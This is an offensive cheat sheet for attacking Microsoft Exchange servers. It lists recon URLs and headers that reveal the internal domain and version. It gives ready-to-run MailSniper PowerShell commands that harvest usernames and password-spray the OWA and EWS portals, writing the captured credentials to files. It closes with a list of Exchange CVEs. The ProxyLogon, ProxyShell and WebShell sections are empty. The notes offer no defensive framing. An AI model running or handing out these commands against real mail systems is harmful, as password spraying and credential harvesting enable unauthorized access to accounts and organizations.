# Exchange CVE
Exchange CVE 

## Recon

* local domain name
  * https://mail.target.ir/autodiscover/autodiscover.json
  * X-CalculatedBETarget: exchange-01.target.local

* exchange version check
  *  https://mail.target.ir/EWS/Exchange.asmx
  *  X-OWA-Version: 15.2.1118.9

* get exchange version
```python
sudo python3 get_exchange_version.py https://mail.target.com
```



## Bruteforce

### use MailSniper enum

```powershell
Import-Module MailSniper.ps1
Invoke-DomainHarvestOWA -ExchHostname mail.domain.com
```

### Password Spray
* PasswordSprayOWA : will attempt to connect to an OWA portal and perform a password spraying attack using a userlist and a single password.
* PasswordSprayEWS :  will attempt to connect to an EWS portal and perform a password spraying attack using a userlist and a single password.

```powershell
Import-Module MailSniper.ps1
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
```




## GAL 

## ProxyLogon


## ProxyShell


## WebShell



#### most famous cve
```
cve-2021-31206
cve-2021-31207
cve-2021-34473
cve-2021-34523
cve-2021-26855
cve-2021-26857
cve-2021-26858
cve-2021-27065
cve-2015-1635
```

